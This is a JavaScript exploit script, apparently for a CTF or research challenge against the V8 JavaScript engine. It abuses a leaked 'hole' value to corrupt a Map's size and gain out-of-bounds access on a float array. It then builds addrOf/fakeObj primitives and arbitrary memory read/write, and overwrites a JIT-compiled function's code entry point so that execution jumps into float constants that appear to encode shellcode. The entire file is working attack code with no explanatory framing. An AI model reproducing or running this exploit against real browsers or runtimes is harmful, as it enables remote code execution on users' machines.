const jit_hijack = () => {
  return [
    -1.1935504820988301e+148, // mark
    1.9710255989867843e-246,
    1.971182898890236e-246,
    1.9711456320011017e-246,
    1.9711828988902365e-246,
    1.97118242283721e-246,
    1.97118289889686e-246,
    1.97118289994653e-246,
    1.9711828988945186e-246,
    1.971182898890234e-246,
    1.9711829003383248e-246,
    1.291834424613085e-241,
    1.9711828988865938e-246,
    1.971182898881177e-246,
    ]           
}

// force tubofan compile
for (let i = 0; i < 100_000; i++) {
  jit_hijack(); jit_hijack(); jit_hijack();
}
// Helper functions to convert between float and integer primitives
var buf = new ArrayBuffer(8); // 8 byte array buffer
var f64_buf = new Float64Array(buf);
var u64_buf = new Uint32Array(buf);

/**
  * Float to Integer
  * in: Float (ex: 2.2)
  * out: Unsigned Int
*/
function ftoi(val) { // typeof(val) = float
  f64_buf[0] = val;
  return BigInt(u64_buf[0]) + (BigInt(u64_buf[1]) << 32n); // Watch for little endianness
}

function dump(arr, len) {
  for (let i = 0; i < len; i++)
    console.log(`${i}: ${ftoh(arr[i])}`)
}

/**
  * Integer to Float
  * in: Unsigned Int
  * out: Float (ex: 2.2)
*/
function itof(val) { // typeof(val) = BigInt
  u64_buf[0] = Number(val & 0xffffffffn);
  u64_buf[1] = Number(val >> 32n);
  return f64_buf[0];
}

/**
  * To hex
  * in: Float (ex: 2.2)
  * out: 0xbaddbeef
*/
function ftoh(val) {
  return "0x" + ftoi(val).toString(16)
}

function hex(val) {
  return "0x" + val.toString(16)
}

function read(addr) {
  // pointer tagging
  if (addr % 2n == 0) {
    addr += 1n;
  }

  fake_arr[1] = itof((6n << 32n) + addr - 8n);
  return ftoi(fake[0]);
}

function write(addr, val) {
  // pointer tagging
  if (addr % 2n == 0) {
    addr += 1n;
  }
  fake_arr[1] = itof((6n << 32n) + addr - 8n);
  fake[0] = itof(BigInt(val));
}

// oob_float[5] === obj_arr[0]
function addrOf(obj) {
  obj_arr[0] = obj;
  addr = (ftoi(oob_float[11]) & 0xffffffffn);
  return addr;
}

// oob_float[5] === obj_arr[0]
function fakeObj(addr) {
  oob_float[11] = itof(BigInt(addr));
  fake = obj_arr[0]
  return fake;
}

let hole = [].hole() // mesma coisa q %TheHole()
var map = new Map();
map.set(1, 1);
map.set(hole, 1);
// delete twice TheHole and make a map.size === -1
map.delete(hole);
map.delete(hole);
map.delete(1);

// create array
var oob_float = new Array(1.1, 2.2);
var obj_arr = [{}, {}];
var float_arr = [1.1, 2.2];

// set map.capacity = 0x10 
map.set(0x10, -1);
map.set(oob_float, 0xffff);

// dump(oob_float, 50)

// test fakeObj/addrOf
if (fakeObj(addrOf({ p: 10 })).p !== 10)
  console.log("[-] Error in fakeObj/addrOf")

var obj_map = ftoi(oob_float[7]) & 0xffffffffn
var float_map = ftoi(oob_float[24]) & 0xffffffffn

console.log("[+] Float  Map: 0x" + float_map.toString(16));
console.log("[+] Object Map: 0x" + obj_map.toString(16));

var fake_arr = [itof(float_map), 1.2, 1.3, 1.4];
var fake = fakeObj(addrOf(fake_arr) + 0x20n);

jit_addr = addrOf(jit_hijack)
jit_code = read(jit_addr + 0x18n) & 0xffffffffn
jit_entry_point = read(jit_code + 0xcn);
write(jit_code + 0xcn, jit_entry_point + 0x77n);

console.log("[+] jit: 0x" + jit_addr.toString(16));
console.log("[+] jit.code: 0x" + jit_code.toString(16));
console.log("[+] jit.code_entry_point: 0x" + jit_entry_point.toString(16));

jit_hijack()